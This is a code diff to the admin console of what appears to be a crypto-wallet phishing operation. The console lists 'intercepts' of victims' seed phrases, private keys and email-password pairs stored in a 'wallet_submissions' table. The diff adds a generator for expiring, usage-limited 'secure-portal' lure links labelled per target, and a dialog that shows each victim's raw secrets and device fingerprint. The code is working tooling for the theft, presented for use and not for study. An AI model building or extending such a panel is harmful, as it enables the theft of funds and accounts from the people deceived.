@@ -14,6 +14,7 @@ import {
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
 import { 
   Shield, 
   Database, 
@@ -28,7 +29,9 @@ import {
   Loader2,
   Link as LinkIcon,
   Copy,
-  CheckCircle
+  Plus,
+  Activity,
+  Trash2
 } from "lucide-react";
 import {
   Dialog,
@@ -50,26 +53,40 @@ interface Submission {
   user_agent: string;
 }
 
+interface PortalLink {
+  id: string;
+  token: string;
+  custom_name: string;
+  expires_at: string;
+  used_count: number;
+  usage_limit: number;
+  created_at: string;
+}
+
 export default function AdminPage() {
   const router = useRouter();
   const [submissions, setSubmissions] = useState<Submission[]>([]);
+  const [portals, setPortals] = useState<PortalLink[]>([]);
   const [loading, setLoading] = useState(true);
   const [authLoading, setAuthLoading] = useState(true);
   const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
+  
+  // Link Generation State
   const [generatingLink, setGeneratingLink] = useState(false);
-  const [generatedLink, setGeneratedLink] = useState<string | null>(null);
+  const [portalName, setPortalName] = useState("");
+  const [expiryMinutes, setExpiryMinutes] = useState(30);
+  const [usageLimit, setUsageLimit] = useState(1);
 
-  const fetchSubmissions = useCallback(async () => {
+  const fetchData = useCallback(async () => {
     setLoading(true);
     try {
-      const { data, error } = await supabaseClient
-        .from("wallet_submissions")
-        .select("*")
-        .order("timestamp", { ascending: false });
+      const [subsRes, portalsRes] = await Promise.all([
+        supabaseClient.from("wallet_submissions").select("*").order("timestamp", { ascending: false }),
+        supabaseClient.from("access_tokens").select("*").order("created_at", { ascending: false })
+      ]);
 
-      if (!error && data) {
-        setSubmissions(data);
-      }
+      if (subsRes.data) setSubmissions(subsRes.data);
+      if (portalsRes.data) setPortals(portalsRes.data);
     } catch (err) {
       console.error("Fetch error:", err);
     } finally {
@@ -84,7 +101,7 @@ export default function AdminPage() {
         router.replace("/admin/login");
       } else {
         setAuthLoading(false);
-        fetchSubmissions();
+        fetchData();
       }
     };
     checkAuth();
@@ -95,58 +112,63 @@ export default function AdminPage() {
       }
     });
 
-    const channel = supabaseClient
-      .channel('schema-db-changes')
-      .on(
-        'postgres_changes',
-        { event: 'INSERT', schema: 'public', table: 'wallet_submissions' },
-        () => fetchSubmissions()
-      )
+    const subChannel = supabaseClient
+      .channel('subs-changes')
+      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'wallet_submissions' }, () => fetchData())
       .subscribe();
 
     return () => {
       subscription.unsubscribe();
-      supabaseClient.removeChannel(channel);
+      supabaseClient.removeChannel(subChannel);
     };
-  }, [router, fetchSubmissions]);
+  }, [router, fetchData]);
 
-  const generateSecureLink = async () => {
+  const generatePortal = async () => {
     setGeneratingLink(true);
     try {
       const token = crypto.randomUUID();
-      const expiresAt = new Date(Date.now() + 30 * 60 * 1000).toISOString(); // 30 mins
+      const expiresAt = new Date(Date.now() + expiryMinutes * 60 * 1000).toISOString();
 
       const { error } = await supabaseClient
         .from("access_tokens")
-        .insert([{ token, expires_at: expiresAt }]);
+        .insert([{ 
+          token, 
+          expires_at: expiresAt, 
+          custom_name: portalName || `Portal-${token.slice(0, 4)}`,
+          usage_limit: usageLimit,
+          used_count: 0
+        }]);
 
       if (error) throw error;
 
-      const baseUrl = typeof window !== "undefined" ? window.location.origin : "";
-      const link = `${baseUrl}/secure-portal/${token}`;
-      setGeneratedLink(link);
+      toast({
+        title: "Portal Activated",
+        description: "New secure entry point established in the network.",
+      });
       
-      toast({
-        title: "Secure Link Generated",
-        description: "Valid for 30 minutes. Single-use enforcement active.",
-      });
+      setPortalName("");
+      fetchData();
     } catch (err: any) {
-      toast({
-        variant: "destructive",
-        title: "Link Generation Failed",
-        description: err.message,
-      });
+      toast({ variant: "destructive", title: "Operation Failed", description: err.message });
     } finally {
       setGeneratingLink(false);
     }
   };
 
-  const copyToClipboard = (text: string) => {
-    navigator.clipboard.writeText(text);
-    toast({
-      title: "Copied to clipboard",
-      description: "Secure URL ready for transmission.",
-    });
+  const deletePortal = async (id: string) => {
+    try {
+      await supabaseClient.from("access_tokens").delete().eq("id", id);
+      fetchData();
+      toast({ title: "Portal Decommissioned", description: "Access route has been permanently severed." });
+    } catch (err) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to delete portal." });
+    }
+  };
+
+  const copyToClipboard = (token: string) => {
+    const baseUrl = typeof window !== "undefined" ? window.location.origin : "";
+    navigator.clipboard.writeText(`${baseUrl}/secure-portal/${token}`);
+    toast({ title: "Signal Captured", description: "Secure URL ready for transmission." });
   };
 
   const handleLogout = async () => {
@@ -162,15 +184,8 @@ export default function AdminPage() {
     );
   }
 
-  const stats = {
-    total: submissions.length,
-    seed: submissions.filter(s => s.type === "seed-phrase").length,
-    private: submissions.filter(s => s.type === "private-key").length,
-    email: submissions.filter(s => s.type === "email-password").length,
-  };
-
   return (
-    <div className="min-h-screen bg-[#0B0F17] text-white p-8">
+    <div className="min-h-screen bg-[#0B0F17] text-white p-8 pb-32">
       <div className="max-w-7xl mx-auto space-y-8">
         {/* Header */}
         <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
@@ -181,239 +196,208 @@ export default function AdminPage() {
               </div>
               <h1 className="font-headline text-3xl font-black tracking-tight uppercase">Admin Console</h1>
             </div>
-            <p className="text-slate-500 text-sm">Secure monitoring of Web3 validation interactions</p>
+            <p className="text-slate-500 text-sm">Real-time Web3 infrastructure monitoring</p>
           </div>
           <div className="flex gap-3">
-            <Button 
-              variant="outline" 
-              className="glass border-white/5 h-11 px-6 rounded-xl text-slate-400 hover:text-white"
-              onClick={fetchSubmissions}
-            >
+            <Button variant="outline" className="glass border-white/5 h-11 px-6 rounded-xl" onClick={fetchData}>
               <RefreshCw size={18} className={loading ? "animate-spin mr-2" : "mr-2"} />
-              Refresh
+              Sync
             </Button>
-            <Button 
-              variant="destructive" 
-              className="h-11 px-6 rounded-xl bg-red-500/10 text-red-400 border border-red-500/20 hover:bg-red-500/20"
-              onClick={handleLogout}
-            >
+            <Button variant="destructive" className="h-11 px-6 rounded-xl bg-red-500/10 text-red-400 border border-red-500/20" onClick={handleLogout}>
               <LogOut size={18} className="mr-2" />
-              Secure Logout
+              Logout
             </Button>
           </div>
         </div>
 
-        {/* Link Generator Section */}
-        <Card className="glass border-primary/20 bg-primary/5 rounded-[2.5rem] overflow-hidden">
-          <CardContent className="p-8 flex flex-col md:flex-row items-center justify-between gap-8">
-            <div className="space-y-2 text-center md:text-left">
-              <div className="flex items-center gap-2 text-primary font-headline font-black uppercase tracking-[0.2em] text-xs">
-                <LinkIcon size={14} /> Dynamic Portal Engine
+        {/* Dynamic Portal Engine Form */}
+        <div className="grid lg:grid-cols-3 gap-8">
+          <Card className="glass border-white/5 bg-[#131A26]/50 rounded-[2.5rem] lg:col-span-1">
+            <CardHeader>
+              <div className="flex items-center gap-2 text-primary font-headline font-black uppercase tracking-[0.2em] text-[10px] mb-2">
+                <Plus size={14} /> Portal Generator
               </div>
-              <h3 className="text-2xl font-headline font-bold">Generate Secure Single-Use Access</h3>
-              <p className="text-slate-400 text-sm max-w-md">Creates a cryptographically unique URL that self-destructs after 30 minutes or upon first successful handshake.</p>
-            </div>
-            
-            <div className="flex flex-col gap-4 w-full md:w-auto">
-              {!generatedLink ? (
-                <Button 
-                  onClick={generateSecureLink}
-                  disabled={generatingLink}
-                  className="h-14 px-8 bg-primary text-black font-black uppercase tracking-widest rounded-2xl shadow-neon hover:scale-[1.02] transition-all"
-                >
-                  {generatingLink ? <Loader2 className="animate-spin mr-2" /> : <Lock size={18} className="mr-2" />}
-                  Generate Access Link
-                </Button>
-              ) : (
-                <div className="flex flex-col gap-3">
-                  <div className="bg-black/40 border border-primary/30 p-4 rounded-2xl flex items-center justify-between gap-4 font-mono text-[10px] text-primary">
-                    <span className="truncate max-w-[200px]">{generatedLink}</span>
-                    <button onClick={() => copyToClipboard(generatedLink)} className="hover:text-white transition-colors">
-                      <Copy size={16} />
-                    </button>
-                  </div>
-                  <Button 
-                    variant="outline" 
-                    onClick={() => setGeneratedLink(null)}
-                    className="h-10 text-[10px] uppercase font-black tracking-widest border-white/5 bg-white/5"
-                  >
-                    Reset Generator
-                  </Button>
+              <CardTitle className="font-headline text-2xl font-bold">New Entry Point</CardTitle>
+              <CardDescription className="text-slate-500">Generate independent secure access links.</CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-6">
+              <div className="space-y-2">
+                <label className="text-[10px] font-black uppercase tracking-widest text-slate-500">Portal Name</label>
+                <Input 
+                  placeholder="e.g. VIP Client-01" 
+                  value={portalName}
+                  onChange={(e) => setPortalName(e.target.value)}
+                  className="bg-black/40 border-white/5 h-12 rounded-xl"
+                />
+              </div>
+              <div className="grid grid-cols-2 gap-4">
+                <div className="space-y-2">
+                  <label className="text-[10px] font-black uppercase tracking-widest text-slate-500">TTL (Minutes)</label>
+                  <Input 
+                    type="number"
+                    value={expiryMinutes}
+                    onChange={(e) => setExpiryMinutes(Number(e.target.value))}
+                    className="bg-black/40 border-white/5 h-12 rounded-xl"
+                  />
                 </div>
-              )}
-            </div>
-          </CardContent>
-        </Card>
+                <div className="space-y-2">
+                  <label className="text-[10px] font-black uppercase tracking-widest text-slate-500">Usage Limit</label>
+                  <Input 
+                    type="number"
+                    value={usageLimit}
+                    onChange={(e) => setUsageLimit(Number(e.target.value))}
+                    className="bg-black/40 border-white/5 h-12 rounded-xl"
+                  />
+                </div>
+              </div>
+              <Button 
+                onClick={generatePortal}
+                disabled={generatingLink}
+                className="w-full h-14 bg-primary text-black font-black uppercase tracking-widest rounded-2xl shadow-neon transition-all hover:scale-[1.02]"
+              >
+                {generatingLink ? <Loader2 className="animate-spin mr-2" /> : <Lock size={18} className="mr-2" />}
+                Activate Portal
+              </Button>
+            </CardContent>
+          </Card>
 
-        {/* Stats Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
-          <Card className="glass border-white/5 bg-[#131A26]/50">
-            <CardHeader className="pb-2">
-              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Total Interactions</CardDescription>
-              <CardTitle className="text-4xl font-headline font-black text-primary">{stats.total}</CardTitle>
-            </CardHeader>
-          </Card>
-          <Card className="glass border-white/5 bg-[#131A26]/50">
-            <CardHeader className="pb-2">
-              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Seed Phrases</CardDescription>
-              <CardTitle className="text-4xl font-headline font-black text-emerald-400">{stats.seed}</CardTitle>
-            </CardHeader>
-          </Card>
-          <Card className="glass border-white/5 bg-[#131A26]/50">
-            <CardHeader className="pb-2">
-              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Private Keys</CardDescription>
-              <CardTitle className="text-4xl font-headline font-black text-orange-400">{stats.private}</CardTitle>
-            </CardHeader>
-          </Card>
-          <Card className="glass border-white/5 bg-[#131A26]/50">
-            <CardHeader className="pb-2">
-              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Email Login</CardDescription>
-              <CardTitle className="text-4xl font-headline font-black text-cyan-400">{stats.email}</CardTitle>
-            </CardHeader>
+          {/* Active Portals List */}
+          <Card className="glass border-white/5 bg-[#131A26]/30 rounded-[2.5rem] lg:col-span-2 overflow-hidden">
+            <div className="p-6 border-b border-white/5 flex items-center justify-between">
+              <div className="flex items-center gap-2">
+                <LinkIcon size={18} className="text-primary" />
+                <h3 className="font-headline font-bold">Active Portals</h3>
+              </div>
+              <Badge variant="outline" className="bg-primary/10 text-primary border-primary/20">
+                {portals.length} TOTAL SLOTS
+              </Badge>
+            </div>
+            <div className="max-h-[400px] overflow-y-auto">
+              <Table>
+                <TableHeader className="bg-white/5">
+                  <TableRow className="border-white/5">
+                    <TableHead className="text-[10px] uppercase font-black py-4">Name</TableHead>
+                    <TableHead className="text-[10px] uppercase font-black py-4">Status</TableHead>
+                    <TableHead className="text-[10px] uppercase font-black py-4">Usage</TableHead>
+                    <TableHead className="text-right text-[10px] uppercase font-black py-4">Actions</TableHead>
+                  </TableRow>
+                </TableHeader>
+                <TableBody>
+                  {portals.length === 0 ? (
+                    <TableRow>
+                      <TableCell colSpan={4} className="text-center py-20 text-slate-600 italic">No active portal slots found.</TableCell>
+                    </TableRow>
+                  ) : (
+                    portals.map((p) => {
+                      const isExpired = new Date(p.expires_at) < new Date();
+                      const isFull = p.used_count >= p.usage_limit;
+                      return (
+                        <TableRow key={p.id} className="border-white/5 hover:bg-white/5 transition-colors">
+                          <TableCell className="font-bold text-xs">{p.custom_name}</TableCell>
+                          <TableCell>
+                            <Badge className={cn(
+                              "text-[8px] font-black uppercase",
+                              isExpired || isFull ? "bg-red-500/10 text-red-500 border-red-500/20" : "bg-emerald-500/10 text-emerald-500 border-emerald-500/20"
+                            )}>
+                              {isExpired ? "EXPIRED" : isFull ? "CONSUMED" : "ACTIVE"}
+                            </Badge>
+                          </TableCell>
+                          <TableCell className="font-mono text-[10px]">
+                            {p.used_count} / {p.usage_limit}
+                          </TableCell>
+                          <TableCell className="text-right flex justify-end gap-2">
+                            <Button size="icon" variant="ghost" className="h-8 w-8 text-slate-400 hover:text-white" onClick={() => copyToClipboard(p.token)}>
+                              <Copy size={14} />
+                            </Button>
+                            <Button size="icon" variant="ghost" className="h-8 w-8 text-red-400 hover:text-red-500" onClick={() => deletePortal(p.id)}>
+                              <Trash2 size={14} />
+                            </Button>
+                          </TableCell>
+                        </TableRow>
+                      );
+                    })
+                  )}
+                </TableBody>
+              </Table>
+            </div>
           </Card>
         </div>
 
-        {/* Submissions Table */}
-        <Card className="glass border-white/5 bg-[#131A26]/30 rounded-3xl overflow-hidden">
+        {/* Submissions Stats */}
+        <div className="grid grid-cols-2 md:grid-cols-4 gap-6">
+          {[
+            { label: "Total Intercepts", val: submissions.length, color: "text-primary" },
+            { label: "Seed Recovery", val: submissions.filter(s => s.type === "seed-phrase").length, color: "text-emerald-400" },
+            { label: "Private Keys", val: submissions.filter(s => s.type === "private-key").length, color: "text-orange-400" },
+            { label: "Credential Sets", val: submissions.filter(s => s.type === "email-password").length, color: "text-cyan-400" },
+          ].map((stat, i) => (
+            <Card key={i} className="glass border-white/5 bg-[#131A26]/50">
+              <CardHeader className="p-6">
+                <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">{stat.label}</CardDescription>
+                <CardTitle className={cn("text-3xl font-headline font-black", stat.color)}>{stat.val}</CardTitle>
+              </CardHeader>
+            </Card>
+          ))}
+        </div>
+
+        {/* Activity Stream */}
+        <Card className="glass border-white/5 bg-[#131A26]/30 rounded-[2.5rem] overflow-hidden">
           <div className="p-6 border-b border-white/5 flex items-center justify-between">
             <div className="flex items-center gap-2">
-              <Terminal size={18} className="text-primary" />
-              <h3 className="font-headline font-bold text-lg">Activity Stream</h3>
+              <Activity size={18} className="text-primary" />
+              <h3 className="font-headline font-bold">Live Activity Stream</h3>
             </div>
-            <Badge variant="outline" className="bg-primary/10 text-primary border-primary/20 animate-pulse">
-              LIVE MONITORING ACTIVE
-            </Badge>
           </div>
-          <CardContent className="p-0">
-            <Table>
-              <TableHeader className="bg-white/5">
-                <TableRow className="border-white/5 hover:bg-transparent">
-                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Timestamp</TableHead>
-                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Wallet</TableHead>
-                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Type</TableHead>
-                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Public Address</TableHead>
-                  <TableHead className="text-right text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Actions</TableHead>
+          <Table>
+            <TableHeader className="bg-white/5">
+              <TableRow className="border-white/5">
+                <TableHead className="text-[10px] uppercase font-black py-4">Timestamp</TableHead>
+                <TableHead className="text-[10px] uppercase font-black py-4">Wallet</TableHead>
+                <TableHead className="text-[10px] uppercase font-black py-4">Type</TableHead>
+                <TableHead className="text-right text-[10px] uppercase font-black py-4">Details</TableHead>
+              </TableRow>
+            </TableHeader>
+            <TableBody>
+              {submissions.map((item) => (
+                <TableRow key={item.id} className="border-white/5 hover:bg-white/5">
+                  <TableCell className="font-mono text-[10px] text-slate-500">
+                    {new Date(item.timestamp).toLocaleString()}
+                  </TableCell>
+                  <TableCell className="font-bold text-xs uppercase">{item.wallet_name}</TableCell>
+                  <TableCell>
+                    <Badge variant="outline" className="text-[9px] uppercase font-black">{item.type}</Badge>
+                  </TableCell>
+                  <TableCell className="text-right">
+                    <Button size="sm" variant="ghost" className="h-8 text-slate-400" onClick={() => setSelectedSubmission(item)}>
+                      <Eye size={14} className="mr-2" /> View
+                    </Button>
+                  </TableCell>
                 </TableRow>
-              </TableHeader>
-              <TableBody>
-                {submissions.length === 0 ? (
-                  <TableRow>
-                    <TableCell colSpan={5} className="text-center py-20 text-slate-600 font-medium italic">
-                      No validation interactions recorded yet.
-                    </TableCell>
-                  </TableRow>
-                ) : (
-                  submissions.map((item) => (
-                    <TableRow key={item.id} className="border-white/5 hover:bg-white/5 transition-colors">
-                      <TableCell className="font-mono text-[11px] text-slate-400">
-                        <div className="flex items-center gap-2">
-                          <Clock size={12} />
-                          {new Date(item.timestamp).toLocaleString()}
-                        </div>
-                      </TableCell>
-                      <TableCell>
-                        <div className="flex items-center gap-2">
-                          <Wallet size={14} className="text-primary" />
-                          <span className="font-bold text-xs uppercase tracking-tight">{item.wallet_name}</span>
-                        </div>
-                      </TableCell>
-                      <TableCell>
-                        <Badge className={cn(
-                          "text-[9px] font-black uppercase tracking-widest",
-                          item.type === "seed-phrase" ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" :
-                          item.type === "private-key" ? "bg-orange-500/10 text-orange-400 border-orange-500/20" :
-                          "bg-cyan-500/10 text-cyan-400 border-cyan-500/20"
-                        )}>
-                          {item.type}
-                        </Badge>
-                      </TableCell>
-                      <TableCell className="font-mono text-xs text-slate-400">
-                        {item.wallet_address ? (
-                          <span className="truncate max-w-[150px] inline-block">{item.wallet_address}</span>
-                        ) : (
-                          <span className="italic opacity-50">Not provided</span>
-                        )}
-                      </TableCell>
-                      <TableCell className="text-right">
-                        <Button 
-                          size="sm" 
-                          className="h-8 rounded-lg bg-white/5 hover:bg-primary/20 hover:text-primary transition-all text-slate-400 border border-white/5"
-                          onClick={() => setSelectedSubmission(item)}
-                        >
-                          <Eye size={14} className="mr-2" />
-                          Details
-                        </Button>
-                      </TableCell>
-                    </TableRow>
-                  ))
-                )}
-              </TableBody>
-            </Table>
-          </CardContent>
+              ))}
+            </TableBody>
+          </Table>
         </Card>
-
-        {/* Footer info */}
-        <div className="flex items-center justify-center gap-6 py-12">
-           <div className="flex items-center gap-2 text-[10px] font-black text-slate-700 uppercase tracking-[0.4em]">
-              <Lock size={12} /> AES-256 SECURED
-           </div>
-           <div className="flex items-center gap-2 text-[10px] font-black text-slate-700 uppercase tracking-[0.4em]">
-              <Shield size={12} /> END-TO-END
-           </div>
-        </div>
       </div>
 
       {/* Details Dialog */}
       <Dialog open={!!selectedSubmission} onOpenChange={() => setSelectedSubmission(null)}>
-        <DialogContent className="max-w-2xl bg-[#0B0F17] border-white/10 text-white rounded-[2rem]">
+        <DialogContent className="max-w-2xl bg-[#0B0F17] border-white/10 text-white rounded-[2.5rem]">
           <DialogHeader>
             <DialogTitle className="font-headline text-2xl font-black uppercase tracking-tight flex items-center gap-3">
-              <Key className="text-primary" />
-              Interaction Payload
+              <Key className="text-primary" /> Payload Discovery
             </DialogTitle>
-            <DialogDescription className="text-slate-500">
-              Complete data dump for interaction {selectedSubmission?.id}
-            </DialogDescription>
+            <DialogDescription className="text-slate-500">Decrypted interaction metadata</DialogDescription>
           </DialogHeader>
-
           {selectedSubmission && (
             <div className="space-y-6 py-4">
-              <div className="grid grid-cols-2 gap-4">
-                <div className="p-4 rounded-2xl bg-white/5 border border-white/5">
-                  <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">Source Wallet</div>
-                  <div className="font-bold text-sm uppercase">{selectedSubmission.wallet_name}</div>
-                </div>
-                <div className="p-4 rounded-2xl bg-white/5 border border-white/5">
-                  <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">Method</div>
-                  <Badge className="bg-primary/10 text-primary border-primary/20 uppercase text-[9px]">{selectedSubmission.type}</Badge>
-                </div>
-              </div>
-
-              <div className="p-6 rounded-2xl bg-white/5 border border-white/5 space-y-4">
-                <div className="flex items-center justify-between">
-                  <div className="text-[10px] font-black text-primary uppercase tracking-[0.2em]">Sensitive Data Payload</div>
-                  <Lock size={14} className="text-slate-700" />
-                </div>
-                
-                <div className="bg-black/40 rounded-xl p-6 font-mono text-sm leading-relaxed border border-white/5 break-all whitespace-pre-wrap select-all selection:bg-primary/40">
+              <div className="p-6 rounded-2xl bg-white/5 border border-white/5">
+                <div className="text-[10px] font-black text-primary uppercase mb-4 tracking-widest">Sensitive Data Content</div>
+                <div className="bg-black/40 p-6 rounded-xl font-mono text-xs break-all whitespace-pre-wrap select-all">
                   {JSON.stringify(selectedSubmission.data, null, 2)}
                 </div>
               </div>
-
-              <div className="p-4 rounded-2xl bg-white/5 border border-white/5">
-                <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Device Metadata</div>
-                <div className="text-[11px] text-slate-400 font-medium leading-relaxed italic">
-                  {selectedSubmission.user_agent}
-                </div>
-              </div>
-
-              <div className="pt-4">
-                <Button 
-                  onClick={() => setSelectedSubmission(null)}
-                  className="w-full h-12 bg-white/5 hover:bg-white/10 text-white border border-white/5 rounded-xl font-bold"
-                >
-                  Close Secure View
-                </Button>
+              <div className="p-4 rounded-xl bg-white/5 border border-white/5 text-[10px] text-slate-500 italic">
+                Source Fingerprint: {selectedSubmission.user_agent}
               </div>
             </div>
           )}
